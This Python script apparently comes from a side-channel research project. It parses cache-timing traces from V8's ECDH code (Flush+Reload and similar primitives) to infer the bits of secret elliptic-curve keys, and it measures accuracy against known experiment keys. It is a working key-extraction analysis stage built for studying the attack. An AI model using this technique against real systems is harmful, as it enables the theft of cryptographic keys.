import argparse
import glob
import json
import math
import os
import os
import random
import re
import sys
import time
import traceback

from bokeh.layouts import column
from bokeh.models import HoverTool, LinearAxis, Range1d
from bokeh.palettes import Colorblind
from bokeh.plotting import figure, show
from narwhals import Unknown
import numpy as np
import pandas as pd
from scipy.signal import stft
import bisect
from concurrent.futures import ProcessPoolExecutor, as_completed
from multiprocessing import Manager

from utils import *

manager = Manager()

debug_print = False


class EC_KEY:
    def __init__(self, key_str):
        self.inferred_keys = manager.list()
        self.analysis_stats = manager.list()
        self.broken_trace_cnt = manager.Value("i", 0)
        self.lock = manager.Lock()
        self.bit_counter = []
        if key_str.startswith("0x"):
            self.secret_key = int(key_str, 16)
        else:
            self.secret_key = int("0x" + key_str, 16)
        self.secret_key_bin = bin(self.secret_key)[2:]
        self.key_length = len(self.secret_key_bin)
        self.bit_counter = [
            {"0": 0, "1": 0, "?": 0, "!": 0} for i in range(self.key_length)
        ]

    @staticmethod
    def find_first_aligned(ch_loop, ch_0, ch_1, exp_interval):
        i0 = i1 = i2 = 0

        while i0 < len(ch_loop):
            t0 = ch_loop[i0]

            while i1 < len(ch_0) and ch_0[i1] < t0 - 1e4:
                i1 += 1
            j1 = i1
            while j1 < len(ch_0) and ch_0[j1] <= t0 + 1e4:
                t1 = ch_0[j1]

                while i2 < len(ch_1) and ch_1[i2] < max(t0, t1) - 1e4:
                    i2 += 1
                k2 = i2
                while k2 < len(ch_1) and ch_1[k2] <= min(t0, t1) + 1e4:
                    t2 = ch_1[k2]
                    if debug_print:
                        print("find:", t0, t1, t2)
                    return t0
                j1 += 1
            i0 += 1

        return None

    @staticmethod
    def find_start_point(ch_loop, ch_0, ch_1, exp_interval, tol=0.2):
        t0 = None
        # t0 = EC_KEY.find_first_aligned(ch_loop, ch_0, ch_1, exp_interval)
        # if t0:
        #     if t0 > ch_loop[0] + 2 * exp_interval:
        #         if debug_print:
        #             print("aligned point is not at the beginning")
        #         t0 = None
        #     else:
        # if t0:
        #     exp_low = exp_interval * (1 - tol)
        #     exp_high = exp_interval * (1 + tol)
        #     has_ch0 = np.any((ch_0 >= t0 - exp_high) & (ch_0 <= t0 - exp_low))
        #     has_ch1 = np.any((ch_1 >= t0 - exp_high) & (ch_1 <= t0 - exp_low))
        #     if has_ch0 and has_ch1:
        #         if debug_print:
        #             print("shift start ts by exp_interval")
        #     return t0 - exp_interval

        if t0 == None:
            n = len(ch_loop)
            counts = np.zeros(n, dtype=int)
            exp_next = np.zeros(n, dtype=int)
            one_min = exp_interval * (1 - tol)
            one_max = exp_interval * (1 + tol)
            two_min = exp_interval * (2 - tol)
            two_max = exp_interval * (2 + tol)

            for i in reversed(range(n)):
                prev_t = ch_loop[i]
                for j in range(i + 1, n):
                    diff = ch_loop[j] - prev_t
                    if one_min <= diff <= one_max:
                        if counts[i] < counts[j] + 1:
                            counts[i] = counts[j] + 1
                            exp_next[i] = j
                    if two_min <= diff <= two_max:
                        if counts[i] < counts[j] + 1:
                            counts[i] = counts[j] + 1
                            exp_next[i] = j
                    if diff > two_max:
                        break

            best_idx = np.argmax(counts[:20])
            t0 = ch_loop[best_idx]
            if debug_print:
                print(counts[:20])
                print(best_idx, t0)
            return t0

        return None

    @staticmethod
    def check_aligned_ts(arr, ts, interval):
        lo = bisect.bisect_left(arr, ts - interval)
        hi = bisect.bisect_right(arr, ts + interval)
        return lo != hi  # there is a element in [ts - interval, ts + interval]

    def infer_individual(self, filepath):
        trace = load_trace(filepath)
        ch_loop = trace_to_timestamp(trace[0])
        ch_0 = trace_to_timestamp(trace[1])
        ch_1 = trace_to_timestamp(trace[2])
        if len(ch_loop) == 0 or len(ch_0) == 0 or len(ch_1) == 0:
            return None
        ts0 = min(ch_loop[0], ch_0[0], ch_1[0])

        # ch_loop -= ts0
        # ch_0 -= ts0
        # ch_1 -= ts0

        intervals = np.array(
            [ch_loop[i + 1] - ch_loop[i] for i in range(len(ch_loop) - 1)]
        )
        precision = 10000

        threshold_95 = np.percentile(intervals, 95)
        filtered_intervals = intervals[intervals <= threshold_95]

        rounded_intervals = np.round(filtered_intervals / precision) * precision

        hist, edges = np.histogram(rounded_intervals, bins="auto")
        p = figure(
            title=f"Diff histogram (rounded to {precision})",
            x_axis_label="Interval value",
            y_axis_label="Count",
            background_fill_color="#fafafa",
        )

        freq = hist / hist.sum()
        max_idx = np.argmax(freq)
        exp_interval = (edges[max_idx] + edges[max_idx + 1]) / 2

        if debug_print:
            print("Expected Interval:", exp_interval)

        p.quad(
            top=hist,
            bottom=0,
            left=edges[:-1],
            right=edges[1:],
            fill_color="navy",
            line_color="white",
            alpha=0.6,
        )

        sorted_intervals = np.sort(rounded_intervals)
        cdf_y = np.arange(1, len(sorted_intervals) + 1) / len(sorted_intervals)

        p.extra_y_ranges = {"cdf": Range1d(start=0, end=1)}
        p.add_layout(LinearAxis(y_range_name="cdf", axis_label="CDF"), "right")

        p.line(
            sorted_intervals,
            cdf_y,
            y_range_name="cdf",
            color="firebrick",
            line_width=2,
            legend_label="CDF",
        )

        p.x_range.start = 0
        p.x_range.end = 1e6

        p.legend.location = "center_right"
        p.legend.background_fill_alpha = 0.3

        # show(p)

        threshold = 430_000 * 1.15
        diffs = np.diff(ch_loop)
        break_indices = np.where(diffs > threshold)[0]
        segments = []
        start = 0
        for idx in break_indices:
            segments.append(ch_loop[start : idx + 1])
            start = idx + 1
        segments.append(ch_loop[start:])
        # lengths = [s.size for s in segments]
        lengths = [s.max() - s.min() for s in segments]
        sizes = [s.size for s in segments]
        max_idx = int(np.argmax(lengths))

        if debug_print:
            # print(segments)
            print(f"Max segment length: {lengths[max_idx]}, size: {sizes[max_idx]}")
        if not (
            (20_000_000 <= lengths[max_idx] <= 35_000_000)
            and 200 <= sizes[max_idx] <= 300
        ):
            if debug_print:
                print("broken trace")
            return None

        truncate_start = segments[max_idx][0] - threshold
        ch_loop = ch_loop[ch_loop >= truncate_start]
        ch_0 = ch_0[ch_0 >= truncate_start]
        ch_1 = ch_1[ch_1 >= truncate_start]

        truncate_end = segments[max_idx][-1] + threshold
        ch_loop = ch_loop[ch_loop <= truncate_end]
        ch_0 = ch_0[ch_0 <= truncate_end]
        ch_1 = ch_1[ch_1 <= truncate_end]

        start_ts = EC_KEY.find_start_point(ch_loop, ch_0, ch_1, exp_interval)
        if debug_print:
            print(f"Duration: {int(start_ts), int(ch_loop[-1])}")

        index = 0
        cur_tsc = start_ts
        infer_bits = "1"
        bit_cnt = 0
        ch_0_idx = 0
        ch_1_idx = 0
        lost_cnt = 0
        while index < len(ch_loop):
            if index < 10:
                tolarent_rate = 0.2 * (lost_cnt + 1)
            else:
                tolarent_rate = 0.15 * (lost_cnt + 1)
            exp_tsc_low = cur_tsc + (1 - tolarent_rate) * exp_interval
            exp_tsc_high = cur_tsc + (1 + tolarent_rate) * exp_interval
            if debug_print:
                print(
                    f"index: {len(infer_bits)}, cur: {cur_tsc} expect: {(int(exp_tsc_low), int(exp_tsc_high))}"
                )
            next_tsc = None
            iter_window = []
            while index < len(ch_loop):
                tsc = ch_loop[index]
                if tsc > exp_tsc_high:
                    break
                index += 1
                if tsc >= exp_tsc_low:
                    iter_window.append(tsc)

            exp_tsc = cur_tsc + exp_interval
            if lost_cnt >= 2:
                if debug_print:
                    print(iter_window)
                iter_window = [
                    ts
                    for ts in iter_window
                    if not EC_KEY.check_aligned_ts(ch_0, ts, 10000)
                ]
                iter_window = [
                    ts
                    for ts in iter_window
                    if not EC_KEY.check_aligned_ts(ch_1, ts, 10000)
                ]
                if debug_print:
                    print("filtered:", iter_window)

            if len(iter_window) > 0:
                closest_idx = np.argmin(np.abs(np.array(iter_window) - exp_tsc))
                next_tsc = iter_window[closest_idx]
                # if lost_cnt >= 2:
                #     print(f"reset\n{infer_bits}\n{lost_cnt}: {infer_bits[-lost_cnt:]}")
                #     if all(b == '?' for b in infer_bits[-lost_cnt:]):
                #         infer_bits = infer_bits[:-lost_cnt]
                #     print(f"{infer_bits}")
                lost_cnt = 0
            if not next_tsc:
                next_tsc = cur_tsc + exp_interval

            if len(iter_window) == 0:
                lost_cnt += 1
                if debug_print:
                    print(f"not found, {cur_tsc, next_tsc.astype(int), lost_cnt}")

            ch_start = cur_tsc + 0.25 * (next_tsc - cur_tsc)
            ch_end = cur_tsc + 0.75 * (next_tsc - cur_tsc)
            has_ch0 = False
            while ch_0_idx < len(ch_0) and ch_0[ch_0_idx] <= next_tsc:
                if ch_start <= ch_0[ch_0_idx] and ch_0[ch_0_idx] <= ch_end:
                    has_ch0 = True
                    break
                ch_0_idx += 1

            has_ch1 = False
            while ch_1_idx < len(ch_1) and ch_1[ch_1_idx] <= next_tsc:
                if ch_start <= ch_1[ch_1_idx] and ch_1[ch_1_idx] <= ch_end:
                    has_ch1 = True
                    break
                ch_1_idx += 1

            if has_ch0 and has_ch1:
                # lost_cnt = 0
                infer_bits += "?"
            elif not has_ch0 and not has_ch1:
                infer_bits += "!"
            elif has_ch0:
                # lost_cnt = 0
                infer_bits += "0"
            elif has_ch1:
                # lost_cnt = 0
                infer_bits += "1"
            # print(cur_tsc, next_tsc)
            cur_tsc = next_tsc

        if debug_print:
            print(infer_bits)

        infer_bits = re.sub(r"!{2,}", "", infer_bits)

        # if debug_print:
        #     print(f"Infer:\n{infer_bits}")
        #     print(f"Truth:\n{self.secret_key_bin}")

        length_diff = -len(infer_bits) + len(self.secret_key_bin)
        if length_diff > 0:
            infer_bits += "?" * (len(self.secret_key_bin) - len(infer_bits))
        elif length_diff < 0:
            infer_bits = infer_bits[:length_diff]

        return infer_bits

    def infer_individual_with_cache(self, filepath):
        cache_file = filepath.with_suffix(".inf")
        inferred_key = None
        if cache_file.exists():
            try:
                with open(cache_file, "r") as f:
                    content = f.read().strip()
                    inferred_key = None if content == "None" else content
            except Exception:
                pass
        else:
            inferred_key = self.infer_individual(filepath)
            try:
                with open(cache_file, "w") as f:
                    f.write("None" if inferred_key is None else str(inferred_key))
            except Exception:
                pass
        if inferred_key:
            self.inferred_keys.append(inferred_key)
            stats = self.inference_stats(inferred_key)
            self.analysis_stats.append(stats)
        else:
            with self.lock:
                self.broken_trace_cnt.value += 1

        return filepath, inferred_key

    def inference_stats(self, infer_bits):
        correct_cnt = 0
        incorrect_cnt = 0
        unknown_cnt = 0

        for i in range(min(len(infer_bits), len(self.secret_key_bin))):
            if infer_bits[i] == "?" or infer_bits[i] == "!":
                unknown_cnt += 1
            elif infer_bits[i] == self.secret_key_bin[i]:
                correct_cnt += 1
            else:
                incorrect_cnt += 1

        return correct_cnt, incorrect_cnt, unknown_cnt

    def merge_inference(self):
        self.final_inference = ""
        for key in self.inferred_keys:
            for i in range(self.key_length):
                self.bit_counter[i][key[i]] += 1
        for counter in self.bit_counter:
            major_bit = max(counter, key=counter.get)
            self.final_inference += major_bit

    @staticmethod
    def load_ec_key(filepath):
        print(filepath)
        ec_keypair = json.load(open(filepath))
        print(ec_keypair["key1"])
        return EC_KEY(ec_keypair["key1"])


def infer_all_traces_in_dir(ec_key, directory):
    dir_path = Path(directory)
    executor = ProcessPoolExecutor(max_workers=16)
    futures = []

    for filepath in dir_path.iterdir():
        if not filepath.is_file():
            continue
        if filepath.suffix != ".out":
            continue
        future = executor.submit(ec_key.infer_individual_with_cache, filepath)
        futures.append(future)

    for future in as_completed(futures):
        fp, inferred_key = future.result()
        # if inferred_key == None:
        #     ec_key.broken_trace_cnt += 1
        #     continue
        # ec_key.inferred_keys.append(inferred_key)

        if debug_print:
            stats = None
            if inferred_key:
                stats = ec_key.inference_stats(inferred_key)
            print(fp, stats)
        # ec_key.analysis_stats.append(stats)

    if len(ec_key.analysis_stats) == 0:
        return

    cor, inc, unk = zip(*ec_key.analysis_stats)
    # print(ec_key.analysis_stats)
    print("Broken Trace Count:", ec_key.broken_trace_cnt.value)
    unk_per = np.array(unk) / ec_key.key_length * 100
    print(
        f"Inferred median: {(100 - np.median(unk_per)):.2f}%, min: {100-max(unk_per)}%, max: {100-min(unk_per)}%",
    )

    print(
        f"Unknown median: {np.median(unk_per):.2f}%, min: {min(unk_per)}, max: {max(unk_per)}%%"
    )
    accs = []
    for c, i in zip(cor, inc):
        accs.append(c / (c + i))
    print(
        f"Accuracy: median: {np.median(accs)*100:.2f}%, min: {min(accs)*100:.2f}%, max: {max(accs)*100:.2f}%"
    )


def infer_all_keys(all_keys_dir):
    dir_path = Path(all_keys_dir)
    executor = ProcessPoolExecutor(max_workers=16)
    futures = []

    ec_keys = {}

    pattern = r"v8_ecdh_key_pool_key(\d+)+"
    for subdir in dir_path.iterdir():
        if not subdir.is_dir():
            continue
        matches = re.search(pattern, subdir.name)
        if matches:
            key_id = int(matches.group(1))
        else:
            continue

        if not key_id in ec_keys:
            ec_keys[key_id] = EC_KEY.load_ec_key(
                find_project_root()
                + f"/experiments/v8_ecdh/ec_key_pool/ec_key_{key_id}.json"
            )

        ec_key = ec_keys[key_id]
        for filepath in subdir.iterdir():
            if not filepath.is_file():
                continue
            if filepath.suffix != ".out":
                continue

            future = executor.submit(ec_key.infer_individual_with_cache, filepath)
            futures.append(future)

    for future in as_completed(futures):
        fp, inferred_key = future.result()

    all_key_stats = []
    broken_trace_cnt = 0
    for ec_key in ec_keys.values():
        broken_trace_cnt += ec_key.broken_trace_cnt.value
        ec_key.merge_inference()
        c, i, u = ec_key.inference_stats(ec_key.final_inference)
        stat = (c, i, u / ec_key.key_length * 100)
        all_key_stats.append(stat)
        # print(stat)
        # for k in ec_key.inferred_keys:
        #     print(len(k))
        # print("")
        # print(ec_key.final_inference)
        # print(ec_key.secret_key_bin)
        # return

    cor, inc, unk = zip(*all_key_stats)
    print("Broken Trace Count:", broken_trace_cnt)
    print(
        f"Inferred median: {(100 - np.median(unk)):.2f}%, min: {100-max(unk)}%, max: {100-min(unk)}%",
    )

    print(f"Unknown median: {np.median(unk):.2f}%, min: {min(unk)}, max: {max(unk)}%%")
    accs = []
    for c, i in zip(cor, inc):
        accs.append(c / (c + i))
    print(
        f"Accuracy: median: {np.median(accs)*100:.2f}%, min: {min(accs)*100:.2f}%, max: {max(accs)*100:.2f}%"
    )
    return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret key from on v8 ecdh trace"
    )

    parser.add_argument(
        "--at",
        choices=["FR", "PS", "PP"],
        default="FR",
        help="Attack Primitive: FR or PS (default: FR)",
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        "--all_keys",
        type=str,
        help="all keys",
    )

    group.add_argument(
        "-i",
        "--input_file",
        type=str,
        help="Input file",
    )

    group.add_argument(
        "-d",
        "--input_dir",
        type=str,
        help="Input dir",
    )

    parser.add_argument(
        "--debug",
        action="store_const",
        const=True,
        default=False,
        help="Debug print",
    )

    parser.add_argument(
        "--key_id",
        type=int,
        help="EC key ID",
    )

    args = parser.parse_args()

    if args.debug:
        debug_print = True

    key_id = 0
    if args.key_id != None:
        key_id = int(args.key_id)
    if not args.all_keys:
        ec_key = EC_KEY.load_ec_key(
            find_project_root()
            + f"/experiments/v8_ecdh/ec_key_pool/ec_key_{key_id}.json"
        )

    if args.all_keys:
        infer_all_keys(args.all_keys)
    if args.input_dir:
        infer_all_traces_in_dir(ec_key, args.input_dir)
    elif args.input_file:
        key = ec_key.infer_individual(args.input_file)
        if key:
            print(f"Infer:\n{key}")
            print(f"Truth:\n{ec_key.secret_key_bin}")
            print(
                list(
                    zip(
                        ["correct", "incorrect", "unknown"], ec_key.inference_stats(key)
                    )
                )
            )
